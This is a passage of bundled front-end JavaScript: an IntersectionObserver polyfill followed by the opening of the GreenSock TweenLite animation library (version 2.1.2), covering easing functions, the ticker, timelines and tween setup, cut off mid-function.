var _gsScope;
!(function () {
  "use strict";
  if ("object" == typeof window)
    if (
      "IntersectionObserver" in window &&
      "IntersectionObserverEntry" in window &&
      "intersectionRatio" in window.IntersectionObserverEntry.prototype
    )
      "isIntersecting" in window.IntersectionObserverEntry.prototype ||
        Object.defineProperty(
          window.IntersectionObserverEntry.prototype,
          "isIntersecting",
          {
            get: function () {
              return 0 < this.intersectionRatio;
            },
          }
        );
    else {
      var t = window.document,
        e = [];
      (r.prototype.THROTTLE_TIMEOUT = 100),
        (r.prototype.POLL_INTERVAL = null),
        (r.prototype.USE_MUTATION_OBSERVER = !0),
        (r.prototype.observe = function (t) {
          if (
            !this._observationTargets.some(function (e) {
              return e.element == t;
            })
          ) {
            if (!t || 1 != t.nodeType)
              throw new Error("target must be an Element");
            this._registerInstance(),
              this._observationTargets.push({ element: t, entry: null }),
              this._monitorIntersections(),
              this._checkForIntersections();
          }
        }),
        (r.prototype.unobserve = function (t) {
          (this._observationTargets = this._observationTargets.filter(function (
            e
          ) {
            return e.element != t;
          })),
            this._observationTargets.length ||
              (this._unmonitorIntersections(), this._unregisterInstance());
        }),
        (r.prototype.disconnect = function () {
          (this._observationTargets = []),
            this._unmonitorIntersections(),
            this._unregisterInstance();
        }),
        (r.prototype.takeRecords = function () {
          var t = this._queuedEntries.slice();
          return (this._queuedEntries = []), t;
        }),
        (r.prototype._initThresholds = function (t) {
          var e = t || [0];
          return (
            Array.isArray(e) || (e = [e]),
            e.sort().filter(function (t, e, i) {
              if ("number" != typeof t || isNaN(t) || t < 0 || 1 < t)
                throw new Error(
                  "threshold must be a number between 0 and 1 inclusively"
                );
              return t !== i[e - 1];
            })
          );
        }),
        (r.prototype._parseRootMargin = function (t) {
          var e = (t || "0px").split(/\s+/).map(function (t) {
            var e = /^(-?\d*\.?\d+)(px|%)$/.exec(t);
            if (!e)
              throw new Error(
                "rootMargin must be specified in pixels or percent"
              );
            return { value: parseFloat(e[1]), unit: e[2] };
          });
          return (
            (e[1] = e[1] || e[0]),
            (e[2] = e[2] || e[0]),
            (e[3] = e[3] || e[1]),
            e
          );
        }),
        (r.prototype._monitorIntersections = function () {
          this._monitoringIntersections ||
            ((this._monitoringIntersections = !0),
            this.POLL_INTERVAL
              ? (this._monitoringInterval = setInterval(
                  this._checkForIntersections,
                  this.POLL_INTERVAL
                ))
              : (n(window, "resize", this._checkForIntersections, !0),
                n(t, "scroll", this._checkForIntersections, !0),
                this.USE_MUTATION_OBSERVER &&
                  "MutationObserver" in window &&
                  ((this._domObserver = new MutationObserver(
                    this._checkForIntersections
                  )),
                  this._domObserver.observe(t, {
                    attributes: !0,
                    childList: !0,
                    characterData: !0,
                    subtree: !0,
                  }))));
        }),
        (r.prototype._unmonitorIntersections = function () {
          this._monitoringIntersections &&
            ((this._monitoringIntersections = !1),
            clearInterval(this._monitoringInterval),
            (this._monitoringInterval = null),
            s(window, "resize", this._checkForIntersections, !0),
            s(t, "scroll", this._checkForIntersections, !0),
            this._domObserver &&
              (this._domObserver.disconnect(), (this._domObserver = null)));
        }),
        (r.prototype._checkForIntersections = function () {
          var t = this._rootIsInDom(),
            e = t
              ? this._getRootRect()
              : { top: 0, bottom: 0, left: 0, right: 0, width: 0, height: 0 };
          this._observationTargets.forEach(function (r) {
            var n = r.element,
              s = o(n),
              a = this._rootContainsTarget(n),
              u = r.entry,
              l = t && a && this._computeTargetAndRootIntersection(n, e),
              h = (r.entry = new i({
                time:
                  window.performance && performance.now && performance.now(),
                target: n,
                boundingClientRect: s,
                rootBounds: e,
                intersectionRect: l,
              }));
            u
              ? t && a
                ? this._hasCrossedThreshold(u, h) && this._queuedEntries.push(h)
                : u && u.isIntersecting && this._queuedEntries.push(h)
              : this._queuedEntries.push(h);
          }, this),
            this._queuedEntries.length &&
              this._callback(this.takeRecords(), this);
        }),
        (r.prototype._computeTargetAndRootIntersection = function (e, i) {
          if ("none" != window.getComputedStyle(e).display) {
            for (var r, n, s, a, l, h, p, f, c = o(e), D = u(e), _ = !1; !_; ) {
              var d = null,
                m = 1 == D.nodeType ? window.getComputedStyle(D) : {};
              if ("none" == m.display) return;
              if (
                (D == this.root || D == t
                  ? ((_ = !0), (d = i))
                  : D != t.body &&
                    D != t.documentElement &&
                    "visible" != m.overflow &&
                    (d = o(D)),
                d &&
                  ((r = d),
                  (n = c),
                  (s = Math.max(r.top, n.top)),
                  (a = Math.min(r.bottom, n.bottom)),
                  (l = Math.max(r.left, n.left)),
                  (f = a - s),
                  !(c = 0 <= (p = (h = Math.min(r.right, n.right)) - l) &&
                    0 <= f && {
                      top: s,
                      bottom: a,
                      left: l,
                      right: h,
                      width: p,
                      height: f,
                    })))
              )
                break;
              D = u(D);
            }
            return c;
          }
        }),
        (r.prototype._getRootRect = function () {
          var e;
          if (this.root) e = o(this.root);
          else {
            var i = t.documentElement,
              r = t.body;
            e = {
              top: 0,
              left: 0,
              right: i.clientWidth || r.clientWidth,
              width: i.clientWidth || r.clientWidth,
              bottom: i.clientHeight || r.clientHeight,
              height: i.clientHeight || r.clientHeight,
            };
          }
          return this._expandRectByRootMargin(e);
        }),
        (r.prototype._expandRectByRootMargin = function (t) {
          var e = this._rootMarginValues.map(function (e, i) {
              return "px" == e.unit
                ? e.value
                : (e.value * (i % 2 ? t.width : t.height)) / 100;
            }),
            i = {
              top: t.top - e[0],
              right: t.right + e[1],
              bottom: t.bottom + e[2],
              left: t.left - e[3],
            };
          return (i.width = i.right - i.left), (i.height = i.bottom - i.top), i;
        }),
        (r.prototype._hasCrossedThreshold = function (t, e) {
          var i = t && t.isIntersecting ? t.intersectionRatio || 0 : -1,
            r = e.isIntersecting ? e.intersectionRatio || 0 : -1;
          if (i !== r)
            for (var n = 0; n < this.thresholds.length; n++) {
              var s = this.thresholds[n];
              if (s == i || s == r || s < i != s < r) return !0;
            }
        }),
        (r.prototype._rootIsInDom = function () {
          return !this.root || a(t, this.root);
        }),
        (r.prototype._rootContainsTarget = function (e) {
          return a(this.root || t, e);
        }),
        (r.prototype._registerInstance = function () {
          e.indexOf(this) < 0 && e.push(this);
        }),
        (r.prototype._unregisterInstance = function () {
          var t = e.indexOf(this);
          -1 != t && e.splice(t, 1);
        }),
        (window.IntersectionObserver = r),
        (window.IntersectionObserverEntry = i);
    }
  function i(t) {
    (this.time = t.time),
      (this.target = t.target),
      (this.rootBounds = t.rootBounds),
      (this.boundingClientRect = t.boundingClientRect),
      (this.intersectionRect = t.intersectionRect || {
        top: 0,
        bottom: 0,
        left: 0,
        right: 0,
        width: 0,
        height: 0,
      }),
      (this.isIntersecting = !!t.intersectionRect);
    var e = this.boundingClientRect,
      i = e.width * e.height,
      r = this.intersectionRect,
      n = r.width * r.height;
    this.intersectionRatio = i
      ? Number((n / i).toFixed(4))
      : this.isIntersecting
      ? 1
      : 0;
  }
  function r(t, e) {
    var i = e || {};
    if ("function" != typeof t) throw new Error("callback must be a function");
    if (i.root && 1 != i.root.nodeType)
      throw new Error("root must be an Element");
    (this._checkForIntersections = (function (t, e) {
      var i = null;
      return function () {
        i =
          i ||
          setTimeout(function () {
            t(), (i = null);
          }, e);
      };
    })(this._checkForIntersections.bind(this), this.THROTTLE_TIMEOUT)),
      (this._callback = t),
      (this._observationTargets = []),
      (this._queuedEntries = []),
      (this._rootMarginValues = this._parseRootMargin(i.rootMargin)),
      (this.thresholds = this._initThresholds(i.threshold)),
      (this.root = i.root || null),
      (this.rootMargin = this._rootMarginValues
        .map(function (t) {
          return t.value + t.unit;
        })
        .join(" "));
  }
  function n(t, e, i, r) {
    "function" == typeof t.addEventListener
      ? t.addEventListener(e, i, r || !1)
      : "function" == typeof t.attachEvent && t.attachEvent("on" + e, i);
  }
  function s(t, e, i, r) {
    "function" == typeof t.removeEventListener
      ? t.removeEventListener(e, i, r || !1)
      : "function" == typeof t.detatchEvent && t.detatchEvent("on" + e, i);
  }
  function o(t) {
    var e;
    try {
      e = t.getBoundingClientRect();
    } catch (t) {}
    return e
      ? ((e.width && e.height) ||
          (e = {
            top: e.top,
            right: e.right,
            bottom: e.bottom,
            left: e.left,
            width: e.right - e.left,
            height: e.bottom - e.top,
          }),
        e)
      : { top: 0, bottom: 0, left: 0, right: 0, width: 0, height: 0 };
  }
  function a(t, e) {
    for (var i = e; i; ) {
      if (i == t) return !0;
      i = u(i);
    }
    return !1;
  }
  function u(t) {
    var e = t.parentNode;
    return e && 11 == e.nodeType && e.host
      ? e.host
      : e && e.assignedSlot
      ? e.assignedSlot.parentNode
      : e;
  }
})(),
  (function (t, e) {
    "use strict";
    var i = {},
      r = t.document,
      n = (t.GreenSockGlobals = t.GreenSockGlobals || t),
      s = n[e];
    if (s)
      return (
        "undefined" != typeof module && module.exports && (module.exports = s)
      );
    function o(t) {
      var e,
        i = t.split("."),
        r = n;
      for (e = 0; e < i.length; e++) r[i[e]] = r = r[i[e]] || {};
      return r;
    }
    function a(t) {
      var e,
        i = [],
        r = t.length;
      for (e = 0; e !== r; i.push(t[e++]));
      return i;
    }
    function u() {}
    var l,
      h,
      p,
      f,
      c,
      D,
      _,
      d = o("com.greensock"),
      m = 1e-8,
      g =
        ((D = Object.prototype.toString),
        (_ = D.call([])),
        function (t) {
          return (
            null != t &&
            (t instanceof Array ||
              ("object" == typeof t && !!t.push && D.call(t) === _))
          );
        }),
      y = {},
      v = function (r, s, a, u) {
        (this.sc = y[r] ? y[r].sc : []),
          ((y[r] = this).gsClass = null),
          (this.func = a);
        var l = [];
        (this.check = function (h) {
          for (var p, f, c, D, _ = s.length, d = _; -1 < --_; )
            (p = y[s[_]] || new v(s[_], [])).gsClass
              ? ((l[_] = p.gsClass), d--)
              : h && p.sc.push(this);
          if (0 === d && a) {
            if (
              ((c = (f = ("com.greensock." + r).split(".")).pop()),
              (D = o(f.join("."))[c] = this.gsClass = a.apply(a, l)),
              u)
            )
              if (
                ((n[c] = i[c] = D),
                "undefined" != typeof module && module.exports)
              )
                if (r === e)
                  for (_ in ((module.exports = i[e] = D), i)) D[_] = i[_];
                else i[e] && (i[e][c] = D);
              else
                "function" == typeof define &&
                  define.amd &&
                  define(
                    (t.GreenSockAMDPath ? t.GreenSockAMDPath + "/" : "") +
                      r.split(".").pop(),
                    [],
                    function () {
                      return D;
                    }
                  );
            for (_ = 0; _ < this.sc.length; _++) this.sc[_].check();
          }
        }),
          this.check(!0);
      },
      x = (t._gsDefine = function (t, e, i, r) {
        return new v(t, e, i, r);
      }),
      C = (d._class = function (t, e, i) {
        return (
          (e = e || function () {}),
          x(
            t,
            [],
            function () {
              return e;
            },
            i
          ),
          e
        );
      });
    x.globals = n;
    var F = [0, 0, 1, 1],
      T = C(
        "easing.Ease",
        function (t, e, i, r) {
          (this._func = t),
            (this._type = i || 0),
            (this._power = r || 0),
            (this._params = e ? F.concat(e) : F);
        },
        !0
      ),
      w = (T.map = {}),
      b = (T.register = function (t, e, i, r) {
        for (
          var n,
            s,
            o,
            a,
            u = e.split(","),
            l = u.length,
            h = (i || "easeIn,easeOut,easeInOut").split(",");
          -1 < --l;

        )
          for (
            s = u[l],
              n = r ? C("easing." + s, null, !0) : d.easing[s] || {},
              o = h.length;
            -1 < --o;

          )
            (a = h[o]),
              (w[s + "." + a] =
                w[a + s] =
                n[a] =
                  t.getRatio ? t : t[a] || new t());
      });
    for (
      (p = T.prototype)._calcEnd = !1,
        p.getRatio = function (t) {
          if (this._func)
            return (this._params[0] = t), this._func.apply(null, this._params);
          var e = this._type,
            i = this._power,
            r = 1 === e ? 1 - t : 2 === e ? t : t < 0.5 ? 2 * t : 2 * (1 - t);
          return (
            1 === i
              ? (r *= r)
              : 2 === i
              ? (r *= r * r)
              : 3 === i
              ? (r *= r * r * r)
              : 4 === i && (r *= r * r * r * r),
            1 === e ? 1 - r : 2 === e ? r : t < 0.5 ? r / 2 : 1 - r / 2
          );
        },
        h = (l = ["Linear", "Quad", "Cubic", "Quart", "Quint,Strong"]).length;
      -1 < --h;

    )
      (p = l[h] + ",Power" + h),
        b(new T(null, null, 1, h), p, "easeOut", !0),
        b(new T(null, null, 2, h), p, "easeIn" + (0 === h ? ",easeNone" : "")),
        b(new T(null, null, 3, h), p, "easeInOut");
    (w.linear = d.easing.Linear.easeIn), (w.swing = d.easing.Quad.easeInOut);
    var E = C("events.EventDispatcher", function (t) {
      (this._listeners = {}), (this._eventTarget = t || this);
    });
    ((p = E.prototype).addEventListener = function (t, e, i, r, n) {
      n = n || 0;
      var s,
        o,
        a = this._listeners[t],
        u = 0;
      for (
        this !== f || c || f.wake(),
          null == a && (this._listeners[t] = a = []),
          o = a.length;
        -1 < --o;

      )
        (s = a[o]).c === e && s.s === i
          ? a.splice(o, 1)
          : 0 === u && s.pr < n && (u = o + 1);
      a.splice(u, 0, { c: e, s: i, up: r, pr: n });
    }),
      (p.removeEventListener = function (t, e) {
        var i,
          r = this._listeners[t];
        if (r)
          for (i = r.length; -1 < --i; )
            if (r[i].c === e) return void r.splice(i, 1);
      }),
      (p.dispatchEvent = function (t) {
        var e,
          i,
          r,
          n = this._listeners[t];
        if (n)
          for (
            1 < (e = n.length) && (n = n.slice(0)), i = this._eventTarget;
            -1 < --e;

          )
            (r = n[e]) &&
              (r.up
                ? r.c.call(r.s || i, { type: t, target: i })
                : r.c.call(r.s || i));
      });
    var P = t.requestAnimationFrame,
      O = t.cancelAnimationFrame,
      S =
        Date.now ||
        function () {
          return new Date().getTime();
        },
      A = S();
    for (h = (l = ["ms", "moz", "webkit", "o"]).length; -1 < --h && !P; )
      (P = t[l[h] + "RequestAnimationFrame"]),
        (O =
          t[l[h] + "CancelAnimationFrame"] ||
          t[l[h] + "CancelRequestAnimationFrame"]);
    C("Ticker", function (t, e) {
      var i,
        n,
        s,
        o,
        a,
        l = this,
        h = S(),
        p = !(!1 === e || !P) && "auto",
        D = 500,
        _ = 33,
        d = function (t) {
          var e,
            r,
            u = S() - A;
          D < u && (h += u - _),
            (A += u),
            (l.time = (A - h) / 1e3),
            (e = l.time - a),
            (!i || 0 < e || !0 === t) &&
              (l.frame++, (a += e + (o <= e ? 0.004 : o - e)), (r = !0)),
            !0 !== t && (s = n(d)),
            r && l.dispatchEvent("tick");
        };
      E.call(l),
        (l.time = l.frame = 0),
        (l.tick = function () {
          d(!0);
        }),
        (l.lagSmoothing = function (t, e) {
          return arguments.length
            ? ((D = t || 1e8), void (_ = Math.min(e, D, 0)))
            : D < 1e8;
        }),
        (l.sleep = function () {
          null != s &&
            (p && O ? O(s) : clearTimeout(s),
            (n = u),
            (s = null),
            l === f && (c = !1));
        }),
        (l.wake = function (t) {
          null !== s
            ? l.sleep()
            : t
            ? (h += -A + (A = S()))
            : 10 < l.frame && (A = S() - D + 5),
            (n =
              0 === i
                ? u
                : p && P
                ? P
                : function (t) {
                    return setTimeout(t, (1e3 * (a - l.time) + 1) | 0);
                  }),
            l === f && (c = !0),
            d(2);
        }),
        (l.fps = function (t) {
          return arguments.length
            ? ((o = 1 / ((i = t) || 60)), (a = this.time + o), void l.wake())
            : i;
        }),
        (l.useRAF = function (t) {
          return arguments.length ? (l.sleep(), (p = t), void l.fps(i)) : p;
        }),
        l.fps(t),
        setTimeout(function () {
          "auto" === p &&
            l.frame < 5 &&
            "hidden" !== (r || {}).visibilityState &&
            l.useRAF(!1);
        }, 1500);
    }),
      ((p = d.Ticker.prototype = new d.events.EventDispatcher()).constructor =
        d.Ticker);
    var k = C("core.Animation", function (t, e) {
      if (
        ((this.vars = e = e || {}),
        (this._duration = this._totalDuration = t || 0),
        (this._delay = Number(e.delay) || 0),
        (this._timeScale = 1),
        (this._active = !!e.immediateRender),
        (this.data = e.data),
        (this._reversed = !!e.reversed),
        K)
      ) {
        c || f.wake();
        var i = this.vars.useFrames ? $ : K;
        i.add(this, i._time), this.vars.paused && this.paused(!0);
      }
    });
    (f = k.ticker = new d.Ticker()),
      ((p = k.prototype)._dirty = p._gc = p._initted = p._paused = !1),
      (p._totalTime = p._time = 0),
      (p._rawPrevTime = -1),
      (p._next = p._last = p._onUpdate = p._timeline = p.timeline = null),
      (p._paused = !1);
    var R = function () {
      c &&
        2e3 < S() - A &&
        ("hidden" !== (r || {}).visibilityState || !f.lagSmoothing()) &&
        f.wake();
      var t = setTimeout(R, 2e3);
      t.unref && t.unref();
    };
    R(),
      (p.play = function (t, e) {
        return null != t && this.seek(t, e), this.reversed(!1).paused(!1);
      }),
      (p.pause = function (t, e) {
        return null != t && this.seek(t, e), this.paused(!0);
      }),
      (p.resume = function (t, e) {
        return null != t && this.seek(t, e), this.paused(!1);
      }),
      (p.seek = function (t, e) {
        return this.totalTime(Number(t), !1 !== e);
      }),
      (p.restart = function (t, e) {
        return this.reversed(!1)
          .paused(!1)
          .totalTime(t ? -this._delay : 0, !1 !== e, !0);
      }),
      (p.reverse = function (t, e) {
        return (
          null != t && this.seek(t || this.totalDuration(), e),
          this.reversed(!0).paused(!1)
        );
      }),
      (p.render = function (t, e, i) {}),
      (p.invalidate = function () {
        return (
          (this._time = this._totalTime = 0),
          (this._initted = this._gc = !1),
          (this._rawPrevTime = -1),
          (!this._gc && this.timeline) || this._enabled(!0),
          this
        );
      }),
      (p.isActive = function () {
        var t,
          e = this._timeline,
          i = this._startTime;
        return (
          !e ||
          (!this._gc &&
            !this._paused &&
            e.isActive() &&
            (t = e.rawTime(!0)) >= i &&
            t < i + this.totalDuration() / this._timeScale - m)
        );
      }),
      (p._enabled = function (t, e) {
        return (
          c || f.wake(),
          (this._gc = !t),
          (this._active = this.isActive()),
          !0 !== e &&
            (t && !this.timeline
              ? this._timeline.add(this, this._startTime - this._delay)
              : !t && this.timeline && this._timeline._remove(this, !0)),
          !1
        );
      }),
      (p._kill = function (t, e) {
        return this._enabled(!1, !1);
      }),
      (p.kill = function (t, e) {
        return this._kill(t, e), this;
      }),
      (p._uncache = function (t) {
        for (var e = t ? this : this.timeline; e; )
          (e._dirty = !0), (e = e.timeline);
        return this;
      }),
      (p._swapSelfInParams = function (t) {
        for (var e = t.length, i = t.concat(); -1 < --e; )
          "{self}" === t[e] && (i[e] = this);
        return i;
      }),
      (p._callback = function (t) {
        var e = this.vars,
          i = e[t],
          r = e[t + "Params"],
          n = e[t + "Scope"] || e.callbackScope || this;
        switch (r ? r.length : 0) {
          case 0:
            i.call(n);
            break;
          case 1:
            i.call(n, r[0]);
            break;
          case 2:
            i.call(n, r[0], r[1]);
            break;
          default:
            i.apply(n, r);
        }
      }),
      (p.eventCallback = function (t, e, i, r) {
        if ("on" === (t || "").substr(0, 2)) {
          var n = this.vars;
          if (1 === arguments.length) return n[t];
          null == e
            ? delete n[t]
            : ((n[t] = e),
              (n[t + "Params"] =
                g(i) && -1 !== i.join("").indexOf("{self}")
                  ? this._swapSelfInParams(i)
                  : i),
              (n[t + "Scope"] = r)),
            "onUpdate" === t && (this._onUpdate = e);
        }
        return this;
      }),
      (p.delay = function (t) {
        return arguments.length
          ? (this._timeline.smoothChildTiming &&
              this.startTime(this._startTime + t - this._delay),
            (this._delay = t),
            this)
          : this._delay;
      }),
      (p.duration = function (t) {
        return arguments.length
          ? ((this._duration = this._totalDuration = t),
            this._uncache(!0),
            this._timeline.smoothChildTiming &&
              0 < this._time &&
              this._time < this._duration &&
              0 !== t &&
              this.totalTime(this._totalTime * (t / this._duration), !0),
            this)
          : ((this._dirty = !1), this._duration);
      }),
      (p.totalDuration = function (t) {
        return (
          (this._dirty = !1),
          arguments.length ? this.duration(t) : this._totalDuration
        );
      }),
      (p.time = function (t, e) {
        return arguments.length
          ? (this._dirty && this.totalDuration(),
            this.totalTime(t > this._duration ? this._duration : t, e))
          : this._time;
      }),
      (p.totalTime = function (t, e, i) {
        if ((c || f.wake(), !arguments.length)) return this._totalTime;
        if (this._timeline) {
          if (
            (t < 0 && !i && (t += this.totalDuration()),
            this._timeline.smoothChildTiming)
          ) {
            this._dirty && this.totalDuration();
            var r = this._totalDuration,
              n = this._timeline;
            if (
              (r < t && !i && (t = r),
              (this._startTime =
                (this._paused ? this._pauseTime : n._time) -
                (this._reversed ? r - t : t) / this._timeScale),
              n._dirty || this._uncache(!1),
              n._timeline)
            )
              for (; n._timeline; )
                n._timeline._time !==
                  (n._startTime + n._totalTime) / n._timeScale &&
                  n.totalTime(n._totalTime, !0),
                  (n = n._timeline);
          }
          this._gc && this._enabled(!0, !1),
            (this._totalTime === t && 0 !== this._duration) ||
              (Y.length && tt(), this.render(t, e, !1), Y.length && tt());
        }
        return this;
      }),
      (p.progress = p.totalProgress =
        function (t, e) {
          var i = this.duration();
          return arguments.length
            ? this.totalTime(i * t, e)
            : i
            ? this._time / i
            : this.ratio;
        }),
      (p.startTime = function (t) {
        return arguments.length
          ? (t !== this._startTime &&
              ((this._startTime = t),
              this.timeline &&
                this.timeline._sortChildren &&
                this.timeline.add(this, t - this._delay)),
            this)
          : this._startTime;
      }),
      (p.endTime = function (t) {
        return (
          this._startTime +
          (0 != t ? this.totalDuration() : this.duration()) / this._timeScale
        );
      }),
      (p.timeScale = function (t) {
        if (!arguments.length) return this._timeScale;
        var e, i;
        for (
          t = t || m,
            this._timeline &&
              this._timeline.smoothChildTiming &&
              ((i =
                (e = this._pauseTime) || 0 === e
                  ? e
                  : this._timeline.totalTime()),
              (this._startTime =
                i - ((i - this._startTime) * this._timeScale) / t)),
            this._timeScale = t,
            i = this.timeline;
          i && i.timeline;

        )
          (i._dirty = !0), i.totalDuration(), (i = i.timeline);
        return this;
      }),
      (p.reversed = function (t) {
        return arguments.length
          ? (t != this._reversed &&
              ((this._reversed = t),
              this.totalTime(
                this._timeline && !this._timeline.smoothChildTiming
                  ? this.totalDuration() - this._totalTime
                  : this._totalTime,
                !0
              )),
            this)
          : this._reversed;
      }),
      (p.paused = function (t) {
        if (!arguments.length) return this._paused;
        var e,
          i,
          r = this._timeline;
        return (
          t != this._paused &&
            r &&
            (c || t || f.wake(),
            (i = (e = r.rawTime()) - this._pauseTime),
            !t &&
              r.smoothChildTiming &&
              ((this._startTime += i), this._uncache(!1)),
            (this._pauseTime = t ? e : null),
            (this._paused = t),
            (this._active = this.isActive()),
            !t &&
              0 != i &&
              this._initted &&
              this.duration() &&
              ((e = r.smoothChildTiming
                ? this._totalTime
                : (e - this._startTime) / this._timeScale),
              this.render(e, e === this._totalTime, !0))),
          this._gc && !t && this._enabled(!0, !1),
          this
        );
      });
    var B = C("core.SimpleTimeline", function (t) {
      k.call(this, 0, t),
        (this.autoRemoveChildren = this.smoothChildTiming = !0);
    });
    function M(e) {
      return (
        e &&
        e.length &&
        e !== t &&
        e[0] &&
        (e[0] === t || (e[0].nodeType && e[0].style && !e.nodeType))
      );
    }
    ((p = B.prototype = new k()).constructor = B),
      (p.kill()._gc = !1),
      (p._first = p._last = p._recent = null),
      (p._sortChildren = !1),
      (p.add = p.insert =
        function (t, e, i, r) {
          var n, s;
          if (
            ((t._startTime = Number(e || 0) + t._delay),
            t._paused &&
              this !== t._timeline &&
              (t._pauseTime =
                this.rawTime() - (t._timeline.rawTime() - t._pauseTime)),
            t.timeline && t.timeline._remove(t, !0),
            (t.timeline = t._timeline = this),
            t._gc && t._enabled(!0, !0),
            (n = this._last),
            this._sortChildren)
          )
            for (s = t._startTime; n && n._startTime > s; ) n = n._prev;
          return (
            n
              ? ((t._next = n._next), (n._next = t))
              : ((t._next = this._first), (this._first = t)),
            t._next ? (t._next._prev = t) : (this._last = t),
            (t._prev = n),
            (this._recent = t),
            this._timeline && this._uncache(!0),
            this
          );
        }),
      (p._remove = function (t, e) {
        return (
          t.timeline === this &&
            (e || t._enabled(!1, !0),
            t._prev
              ? (t._prev._next = t._next)
              : this._first === t && (this._first = t._next),
            t._next
              ? (t._next._prev = t._prev)
              : this._last === t && (this._last = t._prev),
            (t._next = t._prev = t.timeline = null),
            t === this._recent && (this._recent = this._last),
            this._timeline && this._uncache(!0)),
          this
        );
      }),
      (p.render = function (t, e, i) {
        var r,
          n = this._first;
        for (this._totalTime = this._time = this._rawPrevTime = t; n; )
          (r = n._next),
            (n._active || (t >= n._startTime && !n._paused && !n._gc)) &&
              (n._reversed
                ? n.render(
                    (n._dirty ? n.totalDuration() : n._totalDuration) -
                      (t - n._startTime) * n._timeScale,
                    e,
                    i
                  )
                : n.render((t - n._startTime) * n._timeScale, e, i)),
            (n = r);
      }),
      (p.rawTime = function () {
        return c || f.wake(), this._totalTime;
      });
    var I = C(
      "TweenLite",
      function (e, i, r) {
        if ((k.call(this, i, r), (this.render = I.prototype.render), null == e))
          throw "Cannot tween a null target.";
        this.target = e = "string" != typeof e ? e : I.selector(e) || e;
        var n,
          s,
          o,
          u =
            e.jquery ||
            (e.length &&
              e !== t &&
              e[0] &&
              (e[0] === t || (e[0].nodeType && e[0].style && !e.nodeType))),
          l = this.vars.overwrite;
        if (
          ((this._overwrite = l =
            null == l
              ? Z[I.defaultOverwrite]
              : "number" == typeof l
              ? l >> 0
              : Z[l]),
          (u || e instanceof Array || (e.push && g(e))) &&
            "number" != typeof e[0])
        )
          for (
            this._targets = o = a(e),
              this._propLookup = [],
              this._siblings = [],
              n = 0;
            n < o.length;
            n++
          )
            (s = o[n])
              ? "string" != typeof s
                ? s.length &&
                  s !== t &&
                  s[0] &&
                  (s[0] === t || (s[0].nodeType && s[0].style && !s.nodeType))
                  ? (o.splice(n--, 1), (this._targets = o = o.concat(a(s))))
                  : ((this._siblings[n] = it(s, this, !1)),
                    1 === l &&
                      1 < this._siblings[n].length &&
                      rt(s, this, null, 1, this._siblings[n]))
                : "string" == typeof (s = o[n--] = I.selector(s)) &&
                  o.splice(n + 1, 1)
              : o.splice(n--, 1);
        else
          (this._propLookup = {}),
            (this._siblings = it(e, this, !1)),
            1 === l &&
              1 < this._siblings.length &&
              rt(e, this, null, 1, this._siblings);
        (this.vars.immediateRender ||
          (0 === i && 0 === this._delay && !1 !== this.vars.immediateRender)) &&
          ((this._time = -m), this.render(Math.min(0, -this._delay)));
      },
      !0
    );
    function N(t) {
      for (var e, i = this._firstPT; i; )
        (e = i.blob
          ? 1 === t && null != this.end
            ? this.end
            : t
            ? this.join("")
            : this.start
          : i.c * t + i.s),
          i.m
            ? (e = i.m.call(this._tween, e, this._target || i.t, this._tween))
            : e < 1e-6 && -1e-6 < e && !i.blob && (e = 0),
          i.f ? (i.fp ? i.t[i.p](i.fp, e) : i.t[i.p](e)) : (i.t[i.p] = e),
          (i = i._next);
    }
    function L(t) {
      return ((1e3 * t) | 0) / 1e3 + "";
    }
    function X(t, e, i, r) {
      var n,
        s,
        o,
        a,
        u,
        l,
        h,
        p = [],
        f = 0,
        c = "",
        D = 0;
      for (
        p.start = t,
          p.end = e,
          t = p[0] = t + "",
          e = p[1] = e + "",
          i && (i(p), (t = p[0]), (e = p[1])),
          p.length = 0,
          n = t.match(V) || [],
          s = e.match(V) || [],
          r && ((r._next = null), (r.blob = 1), (p._firstPT = p._applyPT = r)),
          u = s.length,
          a = 0;
        a < u;
        a++
      )
        (h = s[a]),
          (c += (l = e.substr(f, e.indexOf(h, f) - f)) || !a ? l : ","),
          (f += l.length),
          D ? (D = (D + 1) % 5) : "rgba(" === l.substr(-5) && (D = 1),
          h === n[a] || n.length <= a
            ? (c += h)
            : (c && (p.push(c), (c = "")),
              (o = parseFloat(n[a])),
              p.push(o),
              (p._firstPT = {
                _next: p._firstPT,
                t: p,
                p: p.length - 1,
                s: o,
                c:
                  ("=" === h.charAt(1)
                    ? parseInt(h.charAt(0) + "1", 10) * parseFloat(h.substr(2))
                    : parseFloat(h) - o) || 0,
                f: 0,
                m: D && D < 4 ? Math.round : L,
              })),
          (f += h.length);
      return (
        (c += e.substr(f)) && p.push(c),
        (p.setRatio = N),
        W.test(e) && (p.end = null),
        p
      );
    }
    function z(t, e, i, r, n, s, o, a, u) {
      "function" == typeof r && (r = r(u || 0, t));
      var l = typeof t[e],
        h =
          "function" != l
            ? ""
            : e.indexOf("set") || "function" != typeof t["get" + e.substr(3)]
            ? e
            : "get" + e.substr(3),
        p = "get" !== i ? i : h ? (o ? t[h](o) : t[h]()) : t[e],
        f = "string" == typeof r && "=" === r.charAt(1),
        c = {
          t: t,
          p: e,
          s: p,
          f: "function" == l,
          pg: 0,
          n: n || e,
          m: s ? ("function" == typeof s ? s : Math.round) : 0,
          pr: 0,
          c: f
            ? parseInt(r.charAt(0) + "1", 10) * parseFloat(r.substr(2))
            : parseFloat(r) - p || 0,
        };
      return (
        ("number" == typeof p && ("number" == typeof r || f)) ||
          (o ||
          isNaN(p) ||
          (!f && isNaN(r)) ||
          "boolean" == typeof p ||
          "boolean" == typeof r
            ? ((c.fp = o),
              (c = {
                t: X(
                  p,
                  f
                    ? parseFloat(c.s) +
                        c.c +
                        (c.s + "").replace(/[0-9\-\.]/g, "")
                    : r,
                  a || I.defaultStringFilter,
                  c
                ),
                p: "setRatio",
                s: 0,
                c: 1,
                f: 2,
                pg: 0,
                n: n || e,
                pr: 0,
                m: 0,
              }))
            : ((c.s = parseFloat(p)), f || (c.c = parseFloat(r) - c.s || 0))),
        c.c
          ? ((c._next = this._firstPT) && (c._next._prev = c),
            (this._firstPT = c))
          : void 0
      );
    }
    ((p = I.prototype = new k()).constructor = I),
      (p.kill()._gc = !1),
      (p.ratio = 0),
      (p._firstPT = p._targets = p._overwrittenProps = p._startAt = null),
      (p._notifyPluginsOfEnabled = p._lazy = !1),
      (I.version = "2.1.2"),
      (I.defaultEase = p._ease = new T(null, null, 1, 1)),
      (I.defaultOverwrite = "auto"),
      (I.ticker = f),
      (I.autoSleep = 120),
      (I.lagSmoothing = function (t, e) {
        f.lagSmoothing(t, e);
      }),
      (I.selector =
        t.$ ||
        t.jQuery ||
        function (e) {
          var i = t.$ || t.jQuery;
          return i
            ? (I.selector = i)(e)
